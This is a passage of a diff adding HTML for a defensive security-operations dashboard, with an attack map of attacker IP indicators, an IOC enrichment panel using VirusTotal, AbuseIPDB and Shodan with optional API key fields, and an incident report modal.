+    <div><div class="page-title">Attack Map</div><div class="page-sub">Live network IOC map from File Analysis and IOC Enrichment</div></div>
+    <button class="btn-sec" onclick="renderAttackMap()" style="margin-left:auto">Refresh</button>
+  </div>
+  <div class="attack-map-summary">
+    <div class="attack-map-stat"><span>Total Attacker IPs</span><strong id="am-total">0</strong></div>
+    <div class="attack-map-stat"><span>Countries Involved</span><strong id="am-countries">0</strong></div>
+    <div class="attack-map-stat"><span>High-Risk Sources</span><strong id="am-highrisk">0</strong></div>
+    <div class="attack-map-stat"><span>Open Ports Observed</span><strong id="am-ports">0</strong></div>
+  </div>
+  <div class="attack-map-panel">
+    <div class="attack-map-canvas" id="attack-map-canvas">
+      <div class="attack-map-empty">No public IP indicators available. Analyze a file or enrich IOCs first.</div>
+    </div>
+  </div>
+</div>
+
+<!-- IOC ENRICHMENT -->
+<div class="page" id="page-ioc">
+  <div class="page-header">
+    <div><div class="page-title">IOC Enrichment</div><div class="page-sub">VirusTotal - AbuseIPDB - Shodan (InternetDB)</div></div>
+    <div class="ioc-page-actions">
+      <button class="btn-sec ioc-action-clear" onclick="clearIOCs()">Clear</button>
+      <button class="btn-primary ioc-action-enrich" id="enrich-btn" onclick="runEnrichment()">Enrich All</button>
+    </div>
+  </div>
+  <div class="ioc-layout">
+    <div class="ioc-sidebar">
+      <div class="ioc-side-head"><div><span class="card-title">IOC List</span><p>Queue observables for multi-source enrichment.</p></div><span class="cbadge ioc-count-badge" id="ioc-cnt">0</span></div>
+      <div class="ioc-side-body">
+        <div class="api-keys-panel">
+          <div class="api-key-title">API Keys <span>Optional</span></div>
+          <div class="api-key-row"><span class="api-key-label">VirusTotal</span><div class="api-key-wrap"><input class="api-key-input" id="vt-key" placeholder="VT API key..." type="password"><button class="key-eye-btn" onclick="toggleApiKeyVisibility('vt-key',this)" title="Show or hide key">SHOW</button></div></div>
+          <div class="api-key-row"><span class="api-key-label">AbuseIPDB</span><div class="api-key-wrap"><input class="api-key-input" id="abuse-key" placeholder="AbuseIPDB key..." type="password"><button class="key-eye-btn" onclick="toggleApiKeyVisibility('abuse-key',this)" title="Show or hide key">SHOW</button></div></div>
+          <div class="api-key-row"><span class="api-key-label">Shodan</span><div class="api-key-wrap"><input class="api-key-input" id="shodan-key" placeholder="Shodan API key..." type="password"><button class="key-eye-btn" onclick="toggleApiKeyVisibility('shodan-key',this)" title="Show or hide key">SHOW</button></div></div>
+          <div class="api-key-note">API keys are optional and can be saved in .env. API keys are stored locally in this browser. Shodan currently uses the public InternetDB endpoint.</div>
+        </div>
+        <div class="ioc-add-panel">
+          <input class="ioc-add-input" id="ioc-input" placeholder="Enter IP / Domain / Hash / URL..." onkeydown="if(event.key==='Enter')addIOC()">
+          <button class="btn-primary ioc-add-btn" onclick="addIOC()">Add IOC</button>
+        </div>
+        <div class="ioc-entries" id="ioc-entries"><div style="color:var(--text3);font-size:10px;text-align:center;padding:15px;">Add IOCs above</div></div>
+        <div class="ioc-side-footer">
+          <button class="add-ev-btn ioc-sample-btn" onclick="loadSampleIOCs()">Load Sample IOCs</button>
+        </div>
+      </div>
+    </div>
+    <div style="position:relative;">
+      <div id="ioc-results-panel">
+        <div class="ioc-ready-strip">
+          <div>
+            <strong><span class="ready-check">OK</span><span id="ioc-ready-count">0 IOC(s) ready for enrichment</span></strong>
+            <small>Click "Enrich All" to fetch threat intelligence from all sources.</small>
+          </div>
+          <div class="ioc-source-legend" aria-label="Enrichment sources">
+            <div><span class="ioc-service-badge ioc-service-virustotal"><img src="./assets/ioc/virustotal.png" alt="VirusTotal"></span><span>VirusTotal</span></div>
+            <div><span class="ioc-service-badge ioc-service-abuseipdb"><img src="./assets/ioc/abuseipdb.png" alt="AbuseIPDB"></span><span>AbuseIPDB</span></div>
+            <div><span class="ioc-service-badge ioc-service-shodan"><img src="./assets/ioc/shodan.png" alt="Shodan"></span><span>Shodan</span></div>
+          </div>
+        </div>
+        <div id="ioc-results" class="ioc-results">
+          <div class="ioc-empty-state">Add IOCs and press Enrich All</div>
+        </div>
+      </div>
+      <div class="ioc-footer-note">Enrichment results depend on external source availability and your API rate limits.</div>
+      <div class="loading-overlay" id="ioc-loading"><div class="scan-line"><div class="scan-fill"></div></div><span>Enriching IOCs...</span></div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /content -->
+</div><!-- /main -->
+</div><!-- /shell -->
+</div><!-- /app-shell -->
+<div class="incident-modal" id="incident-report-modal" aria-hidden="true">
+  <div class="incident-modal-card">
+    <div class="incident-modal-head">
+      <div>
+        <div class="incident-modal-kicker">SOC Copilot</div>
+        <div class="incident-modal-title">Incident Report</div>
+      </div>
+      <button class="btn-sec" onclick="closeIncidentReportModal()">Close</button>
+    </div>
+    <pre class="incident-report-preview" id="incident-report-preview">Analyze a file first to generate an incident report.</pre>
+    <div class="incident-modal-actions">
+      <button class="btn-sec" onclick="copyIncidentReport()">Copy Report</button>
+      <button class="btn-primary" onclick="downloadIncidentReportPdf()">Download PDF Report</button>
+      <button class="btn-sec" onclick="closeIncidentReportModal()">Close</button>
+    </div>
+  </div>
+</div>
+<div class="notif" id="notif"></div>
+
+<script src="./app.js?v=20260529-auto-sigma"></script>
+</body>
+</html>
+
+
